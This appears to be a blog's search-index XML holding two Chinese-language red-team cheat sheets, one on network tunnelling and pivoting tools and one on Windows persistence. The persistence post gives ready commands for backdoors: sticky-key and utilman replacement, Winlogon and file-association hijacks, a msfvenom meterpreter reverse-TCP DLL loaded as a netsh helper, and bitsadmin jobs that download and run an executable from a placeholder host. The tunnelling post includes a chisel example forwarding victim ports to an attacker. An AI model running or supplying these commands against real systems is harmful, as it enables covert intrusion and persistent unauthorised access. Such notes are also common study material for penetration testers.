<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>网络隧道技术总结</title>
    <link href="/2021/08/09/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93/"/>
    <url>/2021/08/09/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="windows-netsh端口转发"><a href="#windows-netsh端口转发" class="headerlink" title="windows netsh端口转发"></a>windows netsh端口转发</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">开启转发<br>netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-builtin-name">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=localaddress <span class="hljs-attribute">listenport</span>=localport <span class="hljs-attribute">connectaddress</span>=destaddress <span class="hljs-attribute">connectport</span>=destport<br><br>查看存在的转发<br><br>netsh<span class="hljs-built_in"> interface </span>portproxy show all<br><br>删除指定规则<br><br>netsh<span class="hljs-built_in"> interface </span>portproxy delete v4tov4 <span class="hljs-attribute">listenport</span>=3340 <span class="hljs-attribute">listenaddress</span>=xx.xx.xx.xx<br></code></pre></td></tr></table></figure><p>访问listen的地址端口，会被转发到dest的地址与端口</p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>ssh 命令除了登陆外还有三种代理功能：</p><p>正向代理（-L）：相当于 iptable 的 port forwarding<br>反向代理（-R）：相当于 frp 或者 ngrok<br>socks5 代理（-D）：相当于 ss/ssr</p><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><h4 id="远程端口映射到其他机器"><a href="#远程端口映射到其他机器" class="headerlink" title="远程端口映射到其他机器"></a>远程端口映射到其他机器</h4><p>HostB 上启动一个 PortB 端口，映射到 HostC:PortC 上，在 HostB 上运行：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">HostB<span class="hljs-variable">$ </span>ssh -L 0.0.0.0<span class="hljs-symbol">:PortB</span><span class="hljs-symbol">:HostC</span><span class="hljs-symbol">:PortC</span> user<span class="hljs-variable">@HostC</span><br></code></pre></td></tr></table></figure><p>这时访问 HostB:PortB 相当于访问 HostC:PortC（和 iptable 的 port-forwarding 类似）。</p><h4 id="本地端口通过跳板映射到其他机器"><a href="#本地端口通过跳板映射到其他机器" class="headerlink" title="本地端口通过跳板映射到其他机器"></a>本地端口通过跳板映射到其他机器</h4><p>HostA 上启动一个 PortA 端口，通过 HostB 转发到 HostC:PortC上，在 HostA 上运行：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">HostA<span class="hljs-variable">$ </span>ssh -L 0.0.0.0<span class="hljs-symbol">:PortA</span><span class="hljs-symbol">:HostC</span><span class="hljs-symbol">:PortC</span>  user<span class="hljs-variable">@HostB</span><br></code></pre></td></tr></table></figure><p>这时访问 HostA:PortA 相当于访问 HostC:PortC。</p><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>HostA 将自己可以访问的 HostB:PortB 暴露给外网服务器 HostC:PortC，在 HostA 上运行：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">HostA$ ssh -R HostC:<span class="hljs-built_in">PortC</span>:HostB:<span class="hljs-built_in">PortB</span>  user@HostC<br></code></pre></td></tr></table></figure><p>那么链接 HostC:PortC 就相当于链接 HostB:PortB。使用时需修改 HostC 的 /etc/ssh/sshd_config，添加：</p><p>GatewayPorts yes</p><h3 id="socks5代理"><a href="#socks5代理" class="headerlink" title="socks5代理"></a>socks5代理</h3><p>利用ssh打开SOCKS Proxy</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ssh -N -f -D <span class="hljs-number">9000</span> <span class="hljs-selector-attr">[user]</span>@<span class="hljs-selector-attr">[host]</span><br><br>ssh -N -f -D <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">39999</span>（监听地址端口） xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">22</span>(ssh端口)<br></code></pre></td></tr></table></figure><h2 id="Proxychains"><a href="#Proxychains" class="headerlink" title="Proxychains"></a>Proxychains</h2><h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>proxychains.conf<br></code></pre></td></tr></table></figure><p>修改如下位置</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[ProxyList]</span><br>socks5    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><h3 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains <span class="hljs-built_in">command</span><br></code></pre></td></tr></table></figure><h2 id="Graphtcp"><a href="#Graphtcp" class="headerlink" title="Graphtcp"></a>Graphtcp</h2><p>graftcp 可以把任何指定程序（应用程序、脚本、shell 等）的 TCP 连接重定向到 SOCKS5 或 HTTP 代理。</p><p>安装</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/hmgle/graftcp.git<br><span class="hljs-keyword">cd</span> graftcp &amp;&amp; <span class="hljs-keyword">make</span><br>sudo <span class="hljs-keyword">make</span> install<br>sudo <span class="hljs-keyword">make</span> install_systemd<br></code></pre></td></tr></table></figure><p>使用</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">启动graftcp-<span class="hljs-built_in">local</span>，参数使用socks5代理或<span class="hljs-keyword">http</span>代理的地址，相当于配置了代理<br>graftcp-<span class="hljs-built_in">local</span>/graftcp-<span class="hljs-built_in">local</span> -socks5 <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">1080</span><br>使用graftcp通过代理执行命令<br>如，安装pip包<br>./graftcp pip install requests<br>如，打开firefox<br>./graftcp Firefox<br></code></pre></td></tr></table></figure><h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs verilog">git clone https:<span class="hljs-comment">//github.com/L-codes/Neo-reGeorg.git</span><br>python neoreg<span class="hljs-variable">.py</span> <span class="hljs-keyword">generate</span> -k password<br>生成tunnel文件，将对应的tunnel上传到网站可访问目录下<br>python3 neoreg<span class="hljs-variable">.py</span> -k password -u http:<span class="hljs-comment">//xx/tunnel.php</span><br>默认会开启本地<span class="hljs-number">1080</span>端口socks5,-p参数可指定端口，-l参数可指定监听地址<br></code></pre></td></tr></table></figure><p>详细参考 <a href="http://uuzdaisuki.com/2021/04/15/reGeorg%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">http://uuzdaisuki.com/2021/04/15/reGeorg%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</a></p><h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># frps.ini</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = www.baidu.com<br></code></pre></td></tr></table></figure><p>使用如下命令开启服务器</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frps -<span class="hljs-keyword">c</span> frps.ini<br></code></pre></td></tr></table></figure><h3 id="客户端配置（socks5隧道）"><a href="#客户端配置（socks5隧道）" class="headerlink" title="客户端配置（socks5隧道）"></a>客户端配置（socks5隧道）</h3><p>配置客户端时，要注意common中的ip和端口指向服务器，token与服务器中保持一致，每个socks代理，需要单独起plugin_name，并使用不同的remote_port。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">tls_enable</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">token</span> = www.baidu.com<br><span class="hljs-attr">pool_count</span> = <span class="hljs-number">5</span>        <br><span class="hljs-attr">protocol</span> = tcp                <span class="hljs-comment">#协议类型</span><br><span class="hljs-attr">health_check_type</span> = tcp<br><span class="hljs-attr">health_check_interval_s</span> = <span class="hljs-number">100</span><br><span class="hljs-section">[socks-001]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">6666</span>            <span class="hljs-comment">#代理的端口</span><br><span class="hljs-attr">plugin</span> = socks5               <span class="hljs-comment">#使用的协议</span><br><span class="hljs-attr">plugin_user</span> = admin<br><span class="hljs-attr">plugin_passwd</span> = www.baidu.com<br><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span>         <span class="hljs-comment">#是否加密</span><br><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>使用如下命令开启客户端</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">普通模式：<br>frpc -<span class="hljs-keyword">c</span> frpc.ini<br>后台无回显模式：<br>nohup frpc -<span class="hljs-keyword">c</span> frpc.ini &amp;<br></code></pre></td></tr></table></figure><p>此时在proxyfire等代理工具中配置:</p><ul><li>ip为server_ip</li><li>port为remote_port</li><li>用户为plugin_user</li><li>密码为plugin_passwd</li></ul><p>即可将客户端网络作为代理出口使用</p><p>详细参考 <a href="http://uuzdaisuki.com/2020/10/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7frp/">http://uuzdaisuki.com/2020/10/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7frp/</a></p><h2 id="pivotnacci"><a href="#pivotnacci" class="headerlink" title="pivotnacci"></a>pivotnacci</h2><p>与reGeorg类似，通过http服务建立socks5代理</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">pip3 install pivotnacci<br>pivotnacci  https:<span class="hljs-regexp">//</span>domain.com/agent.php --password <span class="hljs-string">&quot;passwd&quot;</span><br>pivotnacci  https:<span class="hljs-regexp">//</span>domain.com/agent.php --polling-interval <span class="hljs-number">2000</span><br></code></pre></td></tr></table></figure><h2 id="tsocks"><a href="#tsocks" class="headerlink" title="tsocks"></a>tsocks</h2><p>Tsocks是一个透明SOCKS代理软件,可以强迫任何软件通过socks代理上网</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">安装：<br>apt-get install tsocks<br>修改配置文件：<br>vi /etc/tsocks.conf<br>修改以下内容：<br>local = 192.168.1.0/255.255.255.0 <span class="hljs-comment">#local表示本地的网络，也就是不使用socks代理的网络</span><br>server = 127.0.0.1 <span class="hljs-comment"># SOCKS 服务器的 IP</span><br>server_type = 5 <span class="hljs-comment"># SOCKS 服务版本</span><br>server_port = 9999 ＃SOCKS 服务使用的端口<br>运行：<br>tsocks 应用程序<br></code></pre></td></tr></table></figure><h2 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h2><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm">(<span class="hljs-type">Empire</span>) &gt; socksproxyserver<br>(<span class="hljs-type">Empire</span>) &gt; use <span class="hljs-keyword">module</span> management/invoke_socksproxy<br>(<span class="hljs-type">Empire</span>) &gt; set remoteHost xx.xx.xx.xx<br>(<span class="hljs-type">Empire</span>) &gt; run<br></code></pre></td></tr></table></figure><h2 id="sshuttle"><a href="#sshuttle" class="headerlink" title="sshuttle"></a>sshuttle</h2><p><a href="https://github.com/apenwarr/sshuttle">https://github.com/apenwarr/sshuttle</a></p><p>pip install sshuttle</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">pacman</span> -Sy sshuttle<br>apt-get install sshuttle<br>sshuttle -vvr user@<span class="hljs-number">10.10.10.10</span> <span class="hljs-number">10.1.1.0</span>/<span class="hljs-number">24</span><br>sshuttle -vvr username@pivot_host <span class="hljs-number">10.2.2.0</span>/<span class="hljs-number">24</span> <br><br><span class="hljs-comment"># using a private key</span><br>$ sshuttle -vvr root@<span class="hljs-number">10.10.10.10</span> <span class="hljs-number">10.1.1.0</span>/<span class="hljs-number">24</span> -e <span class="hljs-string">&quot;ssh -i ~/.ssh/id_rsa&quot;</span><br></code></pre></td></tr></table></figure><h2 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-built_in">get</span> -v github.<span class="hljs-keyword">com</span>/jpillora/chisel<br><br># forward port <span class="hljs-number">389</span> <span class="hljs-built_in">and</span> <span class="hljs-number">88</span> <span class="hljs-keyword">to</span> hacker computer<br>user@victim$ .\chisel.<span class="hljs-keyword">exe</span> client YOUR_IP:<span class="hljs-number">8008</span> R:<span class="hljs-number">88</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">88</span> R:<span class="hljs-number">389</span>:localhos<span class="hljs-variable">t:389</span> <br>user@hacker$ /<span class="hljs-keyword">opt</span>/chisel/chisel server -<span class="hljs-keyword">p</span> <span class="hljs-number">8008</span> --<span class="hljs-built_in">reverse</span><br></code></pre></td></tr></table></figure><h2 id="Gost"><a href="#Gost" class="headerlink" title="Gost"></a>Gost</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ginuerzh/g</span>ost<br>cd gost<span class="hljs-regexp">/cmd/g</span>ost<br>go build<br><br><span class="hljs-comment"># Socks5 Proxy</span><br>Server side: gost -L=socks5:<span class="hljs-regexp">//</span>:<span class="hljs-number">1080</span><br>Client side: gost -L=:<span class="hljs-number">8080</span> -F=socks5:<span class="hljs-regexp">//</span>server_ip:<span class="hljs-number">1080</span>?notls=true<br><br></code></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://zhuanlan.zhihu.com/p/57630633">https://zhuanlan.zhihu.com/p/57630633</a> SSH 命令的三种代理功能</p>]]></content>
    
    
    <categories>
      
      <category>代理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows持久化总结</title>
    <link href="/2021/08/05/windows%E6%8C%81%E4%B9%85%E5%8C%96%E6%80%BB%E7%BB%93/"/>
    <url>/2021/08/05/windows%E6%8C%81%E4%B9%85%E5%8C%96%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><p>在启动路径中存入后门</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\A</span>dministrator<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>tart Menu<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\S</span>tartup<br></code></pre></td></tr></table></figure><p>启动项注册表</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<br>HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce<br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce<br></code></pre></td></tr></table></figure><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>自启动服务</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>create <span class="hljs-string">&quot;aaa&quot;</span> <span class="hljs-keyword">binpath= </span>  <span class="hljs-string">&quot;C:\Users\Administrator\Desktop\test.exe&quot;</span> <br><span class="hljs-keyword">sc </span>description <span class="hljs-string">&quot;aaa&quot;</span>   <span class="hljs-string">&quot;description&quot;</span> 设置服务的描述字符串 <br><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> <span class="hljs-string">&quot;aaa&quot;</span>   start= auto  设置这个服务为自动启动 <br>net start <span class="hljs-string">&quot;aaa&quot;</span>   启动服务<br></code></pre></td></tr></table></figure><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/sc</span> minute <span class="hljs-string">/mo</span> 5   <span class="hljs-string">/tn</span> <span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-string">/tr</span> C:\Windows\System32\cmd.exe<br></code></pre></td></tr></table></figure><h2 id="替换粘滞键"><a href="#替换粘滞键" class="headerlink" title="替换粘滞键"></a>替换粘滞键</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">copy c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\s</span>ethc.ex c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\s</span>ethc.exe.bak<br>copy c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\s</span>ethc.exe<br></code></pre></td></tr></table></figure><h2 id="utilman-exe"><a href="#utilman-exe" class="headerlink" title="utilman.exe"></a>utilman.exe</h2><p>类似粘滞键用法，将其替换为cmd.exe</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">ctrl+u启动<br>C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\u</span>tilman.exe<br></code></pre></td></tr></table></figure><p>其他类似的</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">屏幕键盘： C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\o</span>sk.exe<br>放大镜： C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\M</span>agnify.exe<br>旁白： C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\N</span>arrator.exe<br>显示切换器 C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\D</span>isplaySwitch.exe<br>应用切换器： C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\A</span>tBroker.exe<br></code></pre></td></tr></table></figure><h2 id="屏保程序"><a href="#屏保程序" class="headerlink" title="屏保程序"></a>屏保程序</h2><p>生成后门exe文件，后缀修改为.scr</p><p>设置屏保程序</p><p>修改屏保程序为后门xx.scr</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">reg.exe add <span class="hljs-string">&quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot;</span> <span class="hljs-string">/v</span> SCRNSAVE.EXE <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;c:\xx.scr&quot;</span> <span class="hljs-string">/f</span><br></code></pre></td></tr></table></figure><h2 id="netsh与helper-dll"><a href="#netsh与helper-dll" class="headerlink" title="netsh与helper.dll"></a>netsh与helper.dll</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">利用msf生成dll文件：<br>msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=xx.xx.xx.xx <span class="hljs-attribute">LPORT</span>=4444 -f dll &gt; /tmp/netsh_helper.dll<br>上传到目标机器<br>在目标机器上执行：<br>netsh <span class="hljs-builtin-name">add</span> helper c:\netsh_helper.dll<br>将netsh添加自启动,每次netsh实用程序启动时,都会执行DLL,并且将建立通信<br></code></pre></td></tr></table></figure><h2 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h2><p>window7以上自带Bitsadmin即后台智能传输服务，用于创建和管理文件传输，可使用它添加bits任务,利用其特性每次重新启动执行指定的程序</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">bitsadmin /transfer n http:<span class="hljs-comment">//github.com/xxx/xxx.exe c:\download\a.exe &amp;&amp; c:\download\a.exe</span><br></code></pre></td></tr></table></figure><p>也可创建定时触发的计划</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">bitsadmin <span class="hljs-string">/create</span> backdoor<br>bitsadmin <span class="hljs-string">/addfile</span> backdoor <span class="hljs-string">&quot;http://xx.xx.xx.xx/1.EXE&quot;</span>  <span class="hljs-string">&quot;C:\1.exe&quot;</span><br>bitsadmin <span class="hljs-string">/SetNotifyCmdLine</span> backdoorC:\1.exe NUL<br>bitsadmin <span class="hljs-string">/SetMinRetryDelay</span> <span class="hljs-string">&quot;backdoor&quot;</span> 60 <br>bitsadmin <span class="hljs-string">/resume</span> backdoor<br></code></pre></td></tr></table></figure><h2 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a>文件关联</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dos">查看文件扩展名关联<br><span class="hljs-built_in">assoc</span> .txt<br>查看文件扩展名关联的目标文件<br><span class="hljs-built_in">ftype</span> txtfile<br></code></pre></td></tr></table></figure><p>可以看到.txt文件被关联到txtfile类型，txtfile对应目标文件为”%SystemRoot%\system32\NOTEPAD.EXE %1”</p><p>那么如果将指向NOTEPAD.EXE的文件修改为指向我们设置的恶意程序，即可在打开txt时执行恶意文件</p><p>在注册表修改\HKEY_CLASS_ROOT\txtfile\shell\open\command值为目标恶意程序，例如修改为cmd.exe</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKCR<span class="hljs-symbol">\t</span>xtfile<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand&quot; /ve /t REG_EXPAND_SZ /d &quot;C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe <span class="hljs-variable">%1&quot; /f</span><br></code></pre></td></tr></table></figure><h2 id="Winlogon"><a href="#Winlogon" class="headerlink" title="Winlogon"></a>Winlogon</h2><p>winlogon.exe在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。在用户登录时，Winlogon进程负责将用户配置文件加载到注册表中</p><p>将其注册表指向文件替换为恶意文件</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg delete &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon&quot; /v Userinit /f<br>reg add &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon&quot;  /v &quot;Userinit&quot; /t REG_SZ /d &quot;C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe,&quot; /f<br></code></pre></td></tr></table></figure><h2 id="Logon-Scripts后门"><a href="#Logon-Scripts后门" class="headerlink" title="Logon Scripts后门"></a>Logon Scripts后门</h2><p>Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p><p>注册表位置:</p><p>HKEY_CURRENT_USER\Environment</p><p>添加新键值对，值为恶意程序路径</p>]]></content>
    
    
    <categories>
      
      <category>持久化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>持久化</tag>
      
    </tags>
    
  </entry>
  
  
  
